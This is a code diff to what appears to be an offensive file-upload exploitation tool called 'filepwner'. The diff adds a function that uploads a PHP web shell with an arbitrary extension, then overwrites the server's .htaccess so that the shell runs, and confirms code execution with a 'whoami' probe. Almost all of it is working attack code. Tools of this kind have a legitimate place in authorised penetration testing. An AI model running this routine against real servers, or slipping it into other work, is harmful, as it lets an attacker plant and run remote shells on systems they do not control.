@@ -1,4 +1,4 @@
-from filepwner import parse_request_file, upload, info, debug, options, check_shell, check_success, success, error, exit_success, failure, upload_and_validate, set_progress_bar, capitalise_random, generate_random_string
+from filepwner import parse_request_file, upload, info, warning, debug, options, check_shell, check_success, success, error, exit_success, failure, upload_and_validate, set_progress_bar, capitalise_random, generate_random_string
 import variations
 import time
 import random
@@ -189,3 +189,47 @@ def name_overflow_cutoff(request_file, session, options, accepted_extensions):
                 file_data = variations.magic_bytes[extension] + file_data
                 message = f"{file_name}, {mimetype_original}, magic bytes: ON"
                 session = upload_and_validate(request_file, session, file_data, file_name, mimetype_original, message, expect_interaction=False, real_extension=f".{php_extension}")
+
+def htaccess_overwrite(request_file, session, options, accepted_extensions):
+    print()
+    info(".htaccess overwrite", spacing=False)
+    print()
+
+    set_progress_bar(len(accepted_extensions)*2)
+    
+    for extension in accepted_extensions:
+        mimetype = variations.mimetypes[extension]
+        with open(variations.shell_path, 'rb') as file: php_file_data = file.read()
+        with open("assets/sample_files/.htaccess", 'rb') as file: file_data = file.read()
+
+        php_file_extension = f".arbext"
+        php_file_name = generate_random_string(10) + php_file_extension
+        message = f"{php_file_name}, {mimetype}, php shell with arbirtrary extension"
+        session, upload_status = upload_and_validate(request_file, session, php_file_data, php_file_name, mimetype, message, return_on_upload=True)
+        if (upload_status == False):
+            warning("The form doesn't seem to allow arbitrary file extensions, probably a blacklist")
+            return
+
+        file_extension = ".htaccess"
+        file_name = file_extension
+        message = f"{file_name}, {mimetype}"
+        session, upload_status = upload_and_validate(request_file, session, file_data, file_name, mimetype, message, return_on_upload=True)
+        if (upload_status == False):
+            continue
+
+        content, headers, host, path = parse_request_file(request_file)
+        upload_url = f"{variations.protocol}://{host}{options.upload_dir}"
+
+        check_result = check_shell(upload_url + php_file_name, more_info=True)
+        if (check_result == True):
+            success("Shell confirmed interactable")
+            exit_success(upload_url + php_file_name)
+        else:
+            debug((upload_url + php_file_name + "?test=whoami"), 0)
+            if (check_result == "printed_out"):
+                warning("Shell was printed as plain text")
+            else:
+                warning("Shell does not seem to be interractable, make sure your upload directory is correct")
+                if (options.manual_check):
+                    input("Manual check enabled, waiting for input...")
+
